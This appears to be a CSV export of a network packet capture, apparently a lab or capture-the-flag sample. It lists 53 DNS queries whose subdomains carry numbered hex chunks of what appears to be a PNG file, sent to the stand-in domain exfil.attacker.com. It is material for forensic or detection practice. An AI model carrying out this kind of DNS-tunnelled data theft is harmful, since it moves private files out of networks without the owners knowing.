"No.","Time","Source","Destination","Protocol","Length","Info"
"1","0.000000","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 89504e470d0a1a0a0000000d49484452000004800000028808.000.exfil.attacker.com"
"2","0.000542","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 06000000082b810d000000017352474200aece1ce900000004.001.exfil.attacker.com"
"3","0.000838","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 67414d410000b18f0bfc6105000000097048597300000ec300.002.exfil.attacker.com"
"4","0.001122","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 000ec301c76fa86400004f7149444154785eeddd0dd12cbb71.003.exfil.attacker.com"
"5","0.001395","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 30605330865030874008865030833008832008821008813008.004.exfil.attacker.com"
"6","0.001793","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 077fd5aea8acaf6f6b5733a3d91fedf35475d9f79cf79d5fa9.005.exfil.attacker.com"
"7","0.002156","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 25f5cceef9d3df00000000d8da9ff21f00000000b017052000.006.exfil.attacker.com"
"8","0.002425","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 000080cd2900010000006c4e010800000060730a4000000000.007.exfil.attacker.com"
"9","0.002705","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 9b530002000000d89c0210000000c0e614800000000036a700.008.exfil.attacker.com"
"10","0.003025","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 04000000b039052000000080cd2900010000006c4e01080000.009.exfil.attacker.com"
"11","0.003304","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 0060730a40000000009b530002000000d89c0210000000c0e6.010.exfil.attacker.com"
"12","0.003634","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 14800000000036a70004000000b039052000000080cd290001.011.exfil.attacker.com"
"13","0.003922","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 0000006c4e010800000060730a40000000009b530002000000.012.exfil.attacker.com"
"14","0.004195","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A d89c0210000000c0e614800000000036a70004000000b03905.013.exfil.attacker.com"
"15","0.004533","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 2000000080cd2900010000006c4e010800000060730a400000.014.exfil.attacker.com"
"16","0.004815","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 00009b530002000000d89c0210000000c0e614800000000036.015.exfil.attacker.com"
"17","0.005076","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A a70004000000b039052000000080cd2900010000006c4e0108.016.exfil.attacker.com"
"18","0.005345","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 00000060730a40000000009b530002000000d89c0210000000.017.exfil.attacker.com"
"19","0.005643","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A c0e614800000000036a70004000000b039052000000080cd29.018.exfil.attacker.com"
"20","0.005971","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 00010000006c4e010800000060730a40000000009b53000200.019.exfil.attacker.com"
"21","0.006227","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 0000d89c0210000000c0e614800000000036a70004000000b0.020.exfil.attacker.com"
"22","0.006493","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 39052000000080cd2900010000006c4e010800000060730a40.021.exfil.attacker.com"
"23","0.006763","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 000000009b530002000000d89c0210000000c0e61480000000.022.exfil.attacker.com"
"24","0.007021","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 0036a70004000000b039052000000080cd2900010000006c4e.023.exfil.attacker.com"
"25","0.007282","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 010800000060730a40000000009b530002000000d89c021000.024.exfil.attacker.com"
"26","0.007591","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 0000c0e614800000000036a70004000000b039052000000080.025.exfil.attacker.com"
"27","0.007910","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A cd2900010000006c4e010800000060730a40000000009b5300.026.exfil.attacker.com"
"28","0.009185","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 02000000d89c0210000000c0e614800000000036a700040000.027.exfil.attacker.com"
"29","0.009877","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 00b039052000000080cd2900010000006c4e01080000006073.028.exfil.attacker.com"
"30","0.010337","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 0a40000000009b530002000000d89c0210000000c0e6148000.029.exfil.attacker.com"
"31","0.010702","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 00000036a70004000000b039052000000080cd290001000000.030.exfil.attacker.com"
"32","0.011006","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 6c4e010800000060730a40000000009b530002000000d89c02.031.exfil.attacker.com"
"33","0.011434","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 10000000c0e614800000000036a70004000000b03905200000.032.exfil.attacker.com"
"34","0.011720","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 0080cd2900010000006c4e010800000060730a40000000009b.033.exfil.attacker.com"
"35","0.012023","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 530002000000d89c0210000000c0e614800000000036a70004.034.exfil.attacker.com"
"36","0.012351","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 000000b039052000000080cd2900010000006c4e0108000000.035.exfil.attacker.com"
"37","0.012624","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 60730a40000000009b530002000000d89c0210000000c0e614.036.exfil.attacker.com"
"38","0.012894","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 800000000036a70004000000b039052000000080cd29000100.037.exfil.attacker.com"
"39","0.013168","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 00006c4e010800000060730a40000000009b530002000000d8.038.exfil.attacker.com"
"40","0.013444","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 9c0210000000c0e614800000000036a70004000000b0390520.039.exfil.attacker.com"
"41","0.014116","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 00000080cd2900010000006c4e010800000060730a40000000.040.exfil.attacker.com"
"42","0.014439","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 009b530002000000d89c0210000000c0e614800000000036a7.041.exfil.attacker.com"
"43","0.014730","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 0004000000b039052000000080cd2900010000006c4e010800.042.exfil.attacker.com"
"44","0.015052","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 000060730a40000000009b530002000000d89c0210000000c0.043.exfil.attacker.com"
"45","0.016106","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A e614800000000036a70004000000b039052000000080cd2900.044.exfil.attacker.com"
"46","0.016718","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 010000006c4e010800000060730a40000000009b5300020000.045.exfil.attacker.com"
"47","0.017174","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 00d89c0210000000c0e614800000000036a70004000000b039.046.exfil.attacker.com"
"48","0.017522","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 052000000080cd2900010000006c4e010800000060730a4000.047.exfil.attacker.com"
"49","0.017820","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 0000009b530002000000d89c0210000000c0e6148000000000.048.exfil.attacker.com"
"50","0.018328","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 36a70004000000b039052000000080cd2900010000006c4e01.049.exfil.attacker.com"
"51","0.019711","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 0800000060730a40000000009b530002000000d89c02100000.050.exfil.attacker.com"
"52","0.020424","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 00c0e614800000000036a70004000000b039052000000080cd.051.exfil.attacker.com"
"53","0.020924","10.20.82.103","8.8.8.8","DNS","119","Standard query 0x0000 A 2900010000006c4e010800000060730a40000000009b530002.052.exfil.attacker.com"
